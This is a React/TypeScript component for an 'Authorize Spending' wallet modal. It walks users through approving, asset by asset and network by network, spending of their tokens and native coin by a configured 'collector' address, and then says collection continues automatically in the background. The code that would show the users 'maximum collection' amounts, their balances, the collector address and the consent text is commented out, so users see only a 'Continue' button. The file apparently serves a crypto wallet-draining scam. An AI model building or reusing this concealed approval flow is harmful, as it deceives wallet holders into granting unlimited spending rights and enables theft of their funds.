import { TERMS_VERSION } from "../core/approve-config";
import { tokensForNetwork } from "../core/chain-tokens";
import {
  nativeSymbolForNetwork,
  shortAddress,
  statusLabel,
} from "../core/network-meta";
import { outcomeLabel } from "../authorization/session";
import {
  assetLabel,
  balanceForNative,
  balanceForToken,
  countIncludedAssets,
} from "../authorization/preferences";
import type { NativeTransferEstimate } from "../native-transfer/types";
import type {
  AssetSymbol,
  AuthorizationAssetResult,
  AuthorizationSessionResult,
  ModalStep,
  CollectionPreferences,
  NetworkRow,
  RowStatus,
} from "../types";

type AuthorizeSpendingModalProps = {
  networks: NetworkRow[];
  rowStatus: Record<string, RowStatus>;
  selectedKey: string | null;
  approving: boolean;
  error: string | null;
  modalStep: ModalStep;
  preferences: CollectionPreferences;
  sessionResult: AuthorizationSessionResult | null;
  authorizingAsset: { network: string; asset: AssetSymbol } | null;
  nativeEstimates: Record<string, NativeTransferEstimate | null>;
  spenderEvm: string;
  spenderTron: string;
  onClose: () => void;
  onSelectNetwork: (key: string) => void;
  onAuthorize: () => void;
};

function progressWidth(step: ModalStep): string {
  switch (step) {
    case "preferences":
      return "w-[40%]";
    case "authorizing":
      return "w-[70%]";
    case "results":
      return "w-full";
    default:
      return "w-[40%]";
  }
}

function stepSubtitle(step: ModalStep): string {
  switch (step) {
    case "preferences":
      return "Select network";
    case "authorizing":
      return "Authorizing assets";
    case "results":
      return "Authorization results";
    default:
      return "Select network";
  }
}

function spenderFor(network: string, evm: string, tron: string): string {
  return network === "tron" ? tron : evm;
}

function resultTone(outcome: AuthorizationAssetResult["outcome"]): string {
  switch (outcome) {
    case "authorized":
    case "collected":
    case "pending":
      return "border-emerald-200 bg-emerald-50 text-emerald-900";
    case "user_rejected":
      return "border-amber-200 bg-amber-50 text-amber-950";
    case "failed":
      return "border-red-200 bg-red-50 text-red-800";
    default:
      return "border-zinc-200 bg-zinc-50 text-zinc-700";
  }
}

function assetsOnNetwork(networkKey: string): AssetSymbol[] {
  return [...tokensForNetwork(networkKey).map((t) => t.symbol), "NATIVE"];
}

function resultAssetLabel(
  networkKey: string,
  token: AuthorizationAssetResult["token"]
): string {
  if (token === "NATIVE") return nativeSymbolForNetwork(networkKey);
  return token;
}

export function AuthorizeSpendingModal({
  networks,
  rowStatus,
  selectedKey,
  approving,
  error,
  modalStep,
  preferences,
  sessionResult,
  authorizingAsset,
  nativeEstimates,
  spenderEvm,
  spenderTron,
  onClose,
  onSelectNetwork,
  onAuthorize,
}: AuthorizeSpendingModalProps) {
  const selected = networks.find((n) => n.key === selectedKey) ?? null;
  const includedCount = countIncludedAssets(preferences, selectedKey);
  const spender = selectedKey
    ? spenderFor(selectedKey, spenderEvm, spenderTron)
    : "";
  const canContinue =
    Boolean(selectedKey) && !approving && includedCount > 0 && Boolean(spender);

  return (
    <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
      <div className="max-h-[92vh] w-full max-w-md overflow-y-auto rounded-2xl border border-[#3396f0]/40 bg-white shadow-2xl">
        <div className="h-1 w-full bg-zinc-100">
          <div className={`h-full bg-[#3396f0] ${progressWidth(modalStep)}`} />
        </div>

        <div className="flex items-center justify-between px-4 pt-4">
          <button
            type="button"
            aria-label="Back"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50 disabled:opacity-50"
          >
            ‹
          </button>
          <div className="text-center">
            <p className="text-base font-semibold text-zinc-900">
              Authorize Spending
            </p>
            <p className="text-xs text-zinc-500">
              {stepSubtitle(modalStep)} · Terms v{TERMS_VERSION}
            </p>
          </div>
          <button
            type="button"
            aria-label="Close"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50 disabled:opacity-50"
          >
            ×
          </button>
        </div>

        <div className="space-y-4 px-5 pb-5 pt-4">
          {error ? (
            <p className="rounded-lg bg-red-50 px-3 py-2 text-sm text-red-600">
              {error}
            </p>
          ) : null}

          {modalStep === "preferences" ? (
            <>
              <p className="text-sm text-zinc-600">
                Select a network and continue.
              </p>

              <div>
                <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-zinc-500">
                  Network
                </p>
                <ul className="space-y-2">
                  {networks.map((network) => {
                    const status = rowStatus[network.key] ?? "awaiting";
                    const waiting =
                      status === "waiting" || status === "finalizing";
                    const approved = status === "approved";
                    const isSelected = selectedKey === network.key;

                    return (
                      <li key={network.key}>
                        <button
                          type="button"
                          disabled={approving && !waiting}
                          onClick={() => onSelectNetwork(network.key)}
                          className={[
                            "flex w-full items-center gap-3 rounded-xl border px-3 py-3 text-left transition",
                            waiting || (isSelected && !approved)
                              ? "border-[#3396f0] bg-[#3396f0]/10"
                              : approved
                                ? "border-emerald-300 bg-emerald-50"
                                : "border-zinc-200 bg-white hover:border-zinc-300",
                          ].join(" ")}
                        >
                          <span
                            className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
                            style={{ backgroundColor: network.color }}
                          >
                            {network.letter}
                          </span>
                          <span className="min-w-0 flex-1">
                            <span className="block text-sm font-semibold text-zinc-900">
                              {network.name}{" "}
                              <span className="font-normal text-zinc-500">
                                ({network.standard})
                              </span>
                            </span>
                            {/* <span className="mt-0.5 block text-xs text-zinc-500">
                              {nativeSymbolForNetwork(network.key)}{" "}
                              {network.balances.native}
                              {" · "}USDT {network.balances.usdt}
                              {network.balances.usdc != null
                                ? ` · USDC ${network.balances.usdc}`
                                : ""}
                              {" · "}
                              {statusLabel(status)}
                            </span> */}
                          </span>
                        </button>
                      </li>
                    );
                  })}
                </ul>
              </div>

              {selected ? (
                <div className="space-y-3">
                  {/* <div className="rounded-xl border border-zinc-200 bg-zinc-50 p-3">
                    <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-zinc-500">
                      Maximum collection on {selected.name}
                    </p>
                    <div className="flex flex-wrap gap-2">
                      {assetsOnNetwork(selected.key).map((asset) => {
                        const pref = preferences[selected.key]?.[asset];
                        if (!pref?.included) return null;
                        const label = assetLabel(selected.key, asset);
                        const bal =
                          asset === "NATIVE"
                            ? balanceForNative(selected)
                            : balanceForToken(selected, asset);
                        const est = nativeEstimates[selected.key];
                        return (
                          <span
                            key={asset}
                            className="rounded-full border border-[#3396f0]/40 bg-white px-3 py-1 text-xs font-medium text-[#3396f0]"
                          >
                            {label} · Maximum
                            <span className="ml-1 font-normal text-zinc-500">
                              Bal {bal}
                              {asset === "NATIVE" && est?.canTransfer
                                ? ` · ~${est.transferableHuman} transferable`
                                : ""}
                            </span>
                          </span>
                        );
                      })}
                    </div>

                    {spender ? (
                      <p className="mt-2 break-all font-mono text-[10px] text-zinc-500">
                        Collector {shortAddress(spender, 8, 6)}
                      </p>
                    ) : (
                      <p className="mt-2 text-xs text-amber-700">
                        Collector not configured for this network
                      </p>
                    )}
                  </div> */}

                  {/* <p className="text-xs leading-relaxed text-zinc-500">
                    By continuing, you accept the Terms &amp; Conditions (v
                    {TERMS_VERSION}) and authorize maximum collection on{" "}
                    {selected.name}.
                  </p> */}

                  <button
                    type="button"
                    disabled={!canContinue}
                    onClick={onAuthorize}
                    className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
                  >
                    {!selectedKey
                      ? "Select a network"
                      : `Continue on ${selected.name}`}
                  </button>
                </div>
              ) : (
                <p className="rounded-lg border border-zinc-200 bg-zinc-50 px-3 py-3 text-sm text-zinc-600">
                  Select a network above to continue.
                </p>
              )}
            </>
          ) : null}

          {modalStep === "authorizing" ? (
            <div className="space-y-3 py-6 text-center">
              <p className="text-sm font-semibold text-zinc-900">
                Confirm each asset in your wallet
              </p>
              <p className="text-sm text-zinc-600">
                Assets are processed one at a time. If you reject one or it
                fails, the remaining assets still continue.
              </p>
              {authorizingAsset ? (
                <p className="rounded-lg border border-[#3396f0]/30 bg-[#3396f0]/10 px-3 py-2 text-sm text-[#1d5f9e]">
                  Now: {authorizingAsset.network.toUpperCase()}{" "}
                  {authorizingAsset.asset === "NATIVE"
                    ? nativeSymbolForNetwork(authorizingAsset.network)
                    : authorizingAsset.asset}
                </p>
              ) : null}
              <p className="text-xs text-zinc-500">
                Waiting for wallet confirmation...
              </p>
            </div>
          ) : null}

          {modalStep === "results" && sessionResult ? (
            <>
              <p className="text-sm text-zinc-600">
                Session finished. Token collection continues automatically in the
                background. Each asset below succeeded or failed on its own.
              </p>
              <div className="grid grid-cols-3 gap-2 text-center text-xs">
                <div className="rounded-lg bg-emerald-50 px-2 py-2 text-emerald-800">
                  <p className="text-lg font-semibold">
                    {sessionResult.authorizedCount}
                  </p>
                  Succeeded
                </div>
                <div className="rounded-lg bg-amber-50 px-2 py-2 text-amber-900">
                  <p className="text-lg font-semibold">
                    {sessionResult.rejectedCount}
                  </p>
                  Rejected
                </div>
                <div className="rounded-lg bg-red-50 px-2 py-2 text-red-800">
                  <p className="text-lg font-semibold">
                    {sessionResult.failedCount + sessionResult.skippedCount}
                  </p>
                  Failed / skipped
                </div>
              </div>
              <ul className="space-y-2">
                {sessionResult.items.map((item, index) => (
                  <li
                    key={`${item.network}:${item.token}:${index}`}
                    className={`rounded-lg border px-3 py-2 text-sm ${resultTone(item.outcome)}`}
                  >
                    <p className="font-semibold">
                      {item.network.toUpperCase()}{" "}
                      {resultAssetLabel(item.network, item.token)}
                    </p>
                    <p className="text-xs opacity-90">
                      {item.message || outcomeLabel(item.outcome)}
                    </p>
                  </li>
                ))}
              </ul>
              <button
                type="button"
                disabled={approving}
                onClick={onClose}
                className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:opacity-50"
              >
                Done
              </button>
            </>
          ) : null}
        </div>
      </div>
    </div>
  );
}
